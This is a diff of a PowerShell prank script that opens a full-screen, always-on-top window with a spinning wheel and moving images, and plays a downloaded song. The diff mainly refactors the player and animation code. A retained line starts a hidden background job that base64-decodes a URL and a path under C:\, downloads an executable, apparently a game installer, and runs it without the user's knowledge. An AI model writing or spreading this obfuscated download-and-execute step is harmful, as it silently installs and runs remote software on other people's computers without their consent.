@@ -12,19 +12,18 @@ public class BufferedPanel : Panel {
 }
 "@ -ReferencedAssemblies System.Windows.Forms,System.Drawing
 
-# Танчики в фоне
+# Танчики
 Start-Job{$f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcdGFuNGlraS5leGU='));iwr([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yZWRpcmVjdC5sZXN0YS5ydS9NVC9sYXRlc3Rfd2ViX2luc3RhbGxfcnU='))) -O $f;&$f}|Out-Null
 
-# Скачать и играть песню
+# Скачать песню и играть через WMP COM
 $script:songPath="$env:TEMP\song.mp3"
 iwr "https://raw.githubusercontent.com/sweetvata/anticheat/main/song.mp3" -O $script:songPath -UseBasicParsing
-$script:player=New-Object System.Windows.Media.MediaPlayer
-Add-Type -AssemblyName PresentationCore
-$script:player=New-Object System.Windows.Media.MediaPlayer
-$script:player.Open([Uri]$script:songPath)
-$script:player.Play()
+$script:wmp=New-Object -ComObject WMPlayer.OCX
+$script:wmp.URL=$script:songPath
+$script:wmp.settings.autoStart=$true
+$script:wmp.controls.play()
 
-# Скачать картинку
+# Картинка
 $script:imgPath="$env:TEMP\bg.jpg"
 iwr "https://raw.githubusercontent.com/sweetvata/anticheat/main/bug.jpg" -O $script:imgPath -UseBasicParsing
 $script:bgImg=[System.Drawing.Image]::FromFile($script:imgPath)
@@ -40,7 +39,19 @@ $script:clr   =@(
     [System.Drawing.Color]::FromArgb(180,50,180),
     [System.Drawing.Color]::FromArgb(0,180,180)
 )
-$script:a=0.0;$script:ticks=0;$script:stopped=$false;$script:result=''
+
+$script:a=0.0; $script:ticks=0; $script:stopped=$false; $script:result=''
+
+# Жуки — используем один hashtable с ключами-индексами
+$rng=New-Object System.Random
+$script:BX=@{}; $script:BY=@{}; $script:BVX=@{}; $script:BVY=@{}; $script:BSZ=@{}
+for($i=0;$i-lt 20;$i++){
+    $script:BX[$i]  =[float]$rng.Next(50,1800)
+    $script:BY[$i]  =[float]$rng.Next(50,900)
+    $script:BVX[$i] =[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
+    $script:BVY[$i] =[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
+    $script:BSZ[$i] =$rng.Next(45,80)
+}
 
 $script:form=New-Object System.Windows.Forms.Form
 $script:form.WindowState='Maximized';$script:form.FormBorderStyle='None'
@@ -49,22 +60,6 @@ $script:form.TopMost=$true;$script:form.BackColor='Black'
 $script:panel=New-Object BufferedPanel
 $script:panel.Dock='Fill';$script:panel.BackColor='Black'
 
-# Жуки - данные движения
-$rng=New-Object System.Random
-$script:bugX  = [float[]]::new(20)
-$script:bugY  = [float[]]::new(20)
-$script:bugVX = [float[]]::new(20)
-$script:bugVY = [float[]]::new(20)
-$script:bugSZ = [int[]]::new(20)
-
-for($i=0;$i-lt 20;$i++){
-    $script:bugX[$i]=[float]$rng.Next(50,1800)
-    $script:bugY[$i]=[float]$rng.Next(50,900)
-    $script:bugVX[$i]=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
-    $script:bugVY[$i]=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
-    $script:bugSZ[$i]=$rng.Next(45,80)
-}
-
 $script:panel.Add_Paint({
     param($s,$e)
     $g=$e.Graphics
@@ -72,16 +67,13 @@ $script:panel.Add_Paint({
     $g.TextRenderingHint=[System.Drawing.Text.TextRenderingHint]::AntiAlias
     $W=$script:panel.Width;$H=$script:panel.Height
 
-    # Фон
     $g.DrawImage($script:bgImg,0,0,$W,$H)
 
-    # Жуки
     for($i=0;$i-lt 20;$i++){
-        $sz=$script:bugSZ[$i]
-        $g.DrawImage($script:bgImg,[int]$script:bugX[$i],[int]$script:bugY[$i],$sz,$sz)
+        $sz=$script:BSZ[$i]
+        $g.DrawImage($script:bgImg,[int]$script:BX[$i],[int]$script:BY[$i],$sz,$sz)
     }
 
-    # Колесо
     $r=[int]([Math]::Min($W,$H)*0.38)
     $cx=[int]($W/2);$cy=[int]($H/2);$x=$cx-$r;$y=$cy-$r;$d=$r*2
 
@@ -117,7 +109,6 @@ $script:panel.Add_Paint({
     $cb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
     $g.FillEllipse($cb,$cx-$cr,$cy-$cr,$cr*2,$cr*2);$cb.Dispose()
 
-    # Стрелка острием вверх
     $as=[float]($r*0.14)
     $pts=@(
         [System.Drawing.PointF]::new([float]$cx,           [float]($cy+$r-$as*0.5)),
@@ -157,16 +148,14 @@ $t1=New-Object System.Windows.Forms.Timer;$t1.Interval=16
 $t1.Add_Tick({
     $script:ticks++
     $W=$script:panel.Width;$H=$script:panel.Height
-
     for($i=0;$i-lt 20;$i++){
-        $script:bugX[$i]+=$script:bugVX[$i]
-        $script:bugY[$i]+=$script:bugVY[$i]
-        if($script:bugX[$i] -lt -90){$script:bugX[$i]=$W+10}
-        elseif($script:bugX[$i] -gt $W+10){$script:bugX[$i]=-90}
-        if($script:bugY[$i] -lt -90){$script:bugY[$i]=$H+10}
-        elseif($script:bugY[$i] -gt $H+10){$script:bugY[$i]=-90}
+        $script:BX[$i]+=$script:BVX[$i]
+        $script:BY[$i]+=$script:BVY[$i]
+        if($script:BX[$i] -lt -90){$script:BX[$i]=[float]($W+10)}
+        elseif($script:BX[$i] -gt $W+10){$script:BX[$i]=[float]-90}
+        if($script:BY[$i] -lt -90){$script:BY[$i]=[float]($H+10)}
+        elseif($script:BY[$i] -gt $H+10){$script:BY[$i]=[float]-90}
     }
-
     if(-not $script:stopped){
         $ms=$script:ticks*16
         if($ms -lt 10000){$script:a=($script:a+12)%360}
@@ -178,7 +167,7 @@ $t1.Add_Tick({
 $tClose=New-Object System.Windows.Forms.Timer;$tClose.Interval=28000
 $tClose.Add_Tick({
     $t1.Stop();$tStop.Stop();$tClose.Stop()
-    $script:player.Stop()
+    try{$script:wmp.controls.stop()}catch{}
     $script:form.Close()
 })
 
